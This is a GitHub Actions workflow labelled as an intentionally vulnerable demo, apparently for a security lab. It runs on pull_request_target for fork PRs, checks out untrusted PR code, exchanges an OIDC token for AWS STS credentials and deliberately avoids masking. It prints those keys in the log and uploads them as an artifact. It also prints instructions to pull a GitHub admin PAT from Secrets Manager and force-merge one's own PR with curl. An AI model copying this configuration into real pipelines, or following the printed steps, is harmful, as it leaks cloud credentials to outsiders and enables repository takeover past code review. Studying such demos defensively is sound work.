name: Demo CI (Intentionally Vulnerable)

# Fires on PR open from forks. This IS the vulnerability being demonstrated.
on:
  pull_request_target:
    types: [opened, synchronize, reopened]

permissions:
  id-token: write
  contents: read

jobs:
  build:
    runs-on: [self-hosted, demo]
    steps:
      # Canonical misconfiguration: checking out PR code under pull_request_target
      # (not required for the cred-dump path, but included to mirror the real-world footgun)
      - name: Checkout PR code
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      # Mint the OIDC token manually. Do NOT use aws-actions/configure-aws-credentials;
      # it calls ::add-mask:: on the STS values and redacts them in the log.
      - name: Mint OIDC token
        id: oidc
        uses: actions/github-script@v7
        with:
          script: |
            return await core.getIDToken('sts.amazonaws.com')
          result-encoding: string

      - name: Exchange OIDC for STS and dump to log
        env:
          ROLE_ARN: ${{ vars.AWS_ROLE_ARN }}
          AWS_REGION: ${{ vars.AWS_REGION }}
          OIDC_TOKEN: ${{ steps.oidc.outputs.result }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
          REPO_FULL: ${{ github.repository }}
        run: |
          set -eu

          CREDS=$(aws sts assume-role-with-web-identity \
            --role-arn "$ROLE_ARN" \
            --role-session-name "demo-pr-${PR_NUMBER}-$(date +%s)" \
            --web-identity-token "$OIDC_TOKEN" \
            --duration-seconds 900 \
            --output json)

          AK=$(echo "$CREDS" | jq -r .Credentials.AccessKeyId)
          SK=$(echo "$CREDS" | jq -r .Credentials.SecretAccessKey)
          ST=$(echo "$CREDS" | jq -r .Credentials.SessionToken)
          EXP=$(echo "$CREDS" | jq -r .Credentials.Expiration)

          echo ""
          echo "============================================================"
          echo "  STS CREDENTIALS (copy into your terminal verbatim)"
          echo "  Valid until: $EXP"
          echo "============================================================"
          echo "export AWS_ACCESS_KEY_ID=$AK"
          echo "export AWS_SECRET_ACCESS_KEY=$SK"
          echo "export AWS_SESSION_TOKEN=$ST"
          echo "export AWS_REGION=$AWS_REGION"
          echo "============================================================"
          echo ""
          echo "Then run, in order:"
          echo ""
          echo "  # 1. Pull the GitHub admin PAT from Secrets Manager"
          echo "  PAT=\$(aws secretsmanager get-secret-value \\"
          echo "    --secret-id demo/github-pat \\"
          echo "    --query SecretString --output text)"
          echo ""
          echo "  # 2. Force-merge your own PR using the stolen PAT"
          echo "  curl -X PUT \\"
          echo "    -H \"Authorization: token \$PAT\" \\"
          echo "    -H \"Accept: application/vnd.github+json\" \\"
          echo "    https://api.github.com/repos/$REPO_FULL/pulls/$PR_NUMBER/merge"
          echo ""
          echo "  # Your PR should flip to 'Merged' in the GitHub UI."
          echo "============================================================"
          # Also write to file for artifact upload (log truncates long lines)
          cat > /tmp/sts-creds.sh <<EOF
          export AWS_ACCESS_KEY_ID=$AK
          export AWS_SECRET_ACCESS_KEY=$SK
          export AWS_SESSION_TOKEN=$ST
          export AWS_REGION=$AWS_REGION
          EOF

      - name: Upload STS credentials as artifact
        uses: actions/upload-artifact@v4
        with:
          name: sts-credentials
          path: /tmp/sts-creds.sh
          retention-days: 1
